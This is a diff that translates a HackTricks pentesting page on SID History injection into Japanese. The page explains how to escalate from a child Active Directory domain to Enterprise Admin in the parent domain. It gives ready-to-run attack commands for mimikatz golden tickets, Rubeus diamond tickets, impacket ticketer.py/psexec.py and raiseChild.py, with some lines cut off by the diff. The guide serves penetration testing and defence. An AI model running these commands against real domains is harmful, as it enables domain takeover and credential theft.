@@ -4,31 +4,29 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* あなたは**サイバーセキュリティ企業**で働いていますか？ HackTricksであなたの**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
+* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **ハッキングのトリックを共有するには、[hacktricks repo](https://github.com/carlospolop/hacktricks)と[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
 
 </details>
 
-## Attack
+## 攻撃
 
-SID History was designed to support migration scenarios, where a user would be moved from one domain to another. To preserve access to resources in the "old" domain, the **user's previous SID would be added to the SID History** of their new account. So when creating such a ticket, the SID of a privileged group (EAs, DAs, etc) in the parent domain can be added that will **grant access to all resources in the parent**.
+SID履歴は、ユーザーが1つのドメインから別のドメインに移動する場合をサポートするために設計されました。 "古い"ドメインのリソースへのアクセスを維持するために、**ユーザーの以前のSIDが新しいアカウントのSID履歴に追加**されます。したがって、このようなチケットを作成すると、親ドメインの特権グループ（EAs、DAsなど）のSIDが追加され、親のすべてのリソースへのアクセスが許可されます。
 
-This can be achieved using either a [**Golden**](sid-history-injection.md#golden-ticket) or [**Diamond Ticket**](sid-history-injection.md#diamond-ticket).
+これは、[**Golden**](sid-history-injection.md#golden-ticket)または[**Diamond Ticket**](sid-history-injection.md#diamond-ticket)を使用して達成できます。
 
-For finding the **SID** of the **"Enterprise Admins"** group you can find the **SID** of the **root domain** and set it in `S-1-5-21-<root domain>-519`. For example, from root domain SID `S-1-5-21-280534878-1496970234-700767426` the **"Enterprise Admins"** group SID is `S-1-5-21-280534878-1496970234-700767426-519`
+「Enterprise Admins」グループの**SID**を見つけるには、**ルートドメイン**の**SID**を見つけて、`S-1-5-21-<root domain>-519`に設定します。たとえば、ルートドメインSID `S-1-5-21-280534878-1496970234-700767426`の**「Enterprise Admins」**グループSIDは`S-1-5-21-280534878-1496970234-700767426-519`です。
 
-You could also use the **Domain Admins** groups, which ends in **512**.
+また、「Domain Admins」グループを使用することもできますが、末尾は**512**です。
 
-Another way yo find the SID of a group of the other domain (for example "Domain Admins") is with:
-
+他のドメインのグループ（たとえば「Domain Admins」）のSIDを見つける別の方法は、次のとおりです：
 ```powershell
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
-
-### Golden Ticket (Mimikatz) with KRBTGT-AES256
+### KRBTGT-AES256を使用したゴールデンチケット（Mimikatz）
 
 {% code overflow="wrap" %}
 ```bash
@@ -49,13 +47,13 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 ```
 {% endcode %}
 
-For more info about golden tickets check:
+詳細については、ゴールデンチケットに関する情報を参照してください：
 
 {% content-ref url="golden-ticket.md" %}
 [golden-ticket.md](golden-ticket.md)
 {% endcontent-ref %}
 
-### Diamond Ticket (Rubeus + KRBTGT-AES256)
+### ダイヤモンドチケット（Rubeus + KRBTGT-AES256）
 
 {% code overflow="wrap" %}
 ```powershell
@@ -69,7 +67,7 @@ Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_s
 ```
 {% endcode %}
 
-For more info about diamond tickets check:
+ダイヤモンドチケットに関する詳細は以下を参照してください：
 
 {% content-ref url="diamond-ticket.md" %}
 [diamond-ticket.md](diamond-ticket.md)
@@ -77,13 +75,13 @@ For more info about diamond tickets check:
 
 {% code overflow="wrap" %}
 ```bash
-.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local 
+.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
 {% endcode %}
 
-Escalate to DA of root or Enterprise admin using the KRBTGT hash of the compromised domain:
+侵害されたドメインのKRBTGTハッシュを使用して、DAまたはルート、またはエンタープライズ管理者にエスカレーションします：
 
 {% code overflow="wrap" %}
 ```bash
@@ -99,15 +97,11 @@ schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
 {% endcode %}
 
-With the acquired permissions from the attack you can execute for example a DCSync attack in the new domain:
+攻撃から取得した権限を使用して、新しいドメインでDCSync攻撃を実行することができます。
 
-{% content-ref url="dcsync.md" %}
-[dcsync.md](dcsync.md)
-{% endcontent-ref %}
+### Linuxから
 
-### From linux
-
-#### Manual with [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
+#### [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)を使用した手動
 
 {% code overflow="wrap" %}
 ```bash
@@ -124,34 +118,32 @@ ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_doma
 # JUST USE THE SAME USERNAME IN THE NEXT STEPS
 
 # Load ticket
-export KRB5CCNAME=hacker.ccache 
+export KRB5CCNAME=hacker.ccache
 
 # psexec in domain controller of root
 psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
 ```
 {% endcode %}
 
-#### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
+#### [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)を使用した自動化
 
-This is an Impacket script which will **automate escalating from child to parent domain**. The script needs:
+これは、Impacketスクリプトであり、**子ドメインから親ドメインへの昇格を自動化**します。スクリプトには以下が必要です：
 
-* Target domain controller
-* Creds for an admin user in the child domain
+* ターゲットのドメインコントローラー
+* 子ドメインの管理者ユーザーの資格情報
 
-The flow is:
+フローは次のとおりです：
 
-* Obtains the SID for the Enterprise Admins group of the parent domain
-* Retrieves the hash for the KRBTGT account in the child domain
-* Creates a Golden Ticket
-* Logs into the parent domain
-* Retrieves credentials for the Administrator account in the parent domain
-* If the `target-exec` switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.
-
+* 親ドメインのEnterprise AdminsグループのSIDを取得します
+* 子ドメインのKRBTGTアカウントのハッシュを取得します
+* ゴールデンチケットを作成します
+* 親ドメインにログインします
+* 親ドメインのAdministratorアカウントの資格情報を取得します
+* `target-exec`スイッチが指定されている場合、Psexecを介して親ドメインのドメインコントローラーに認証します。
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
-
-## References
+## 参考文献
 
 * [https://studylib.net/doc/25696115/crto](https://studylib.net/doc/25696115/crto)
 
@@ -159,10 +151,10 @@ raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
 
 </details>
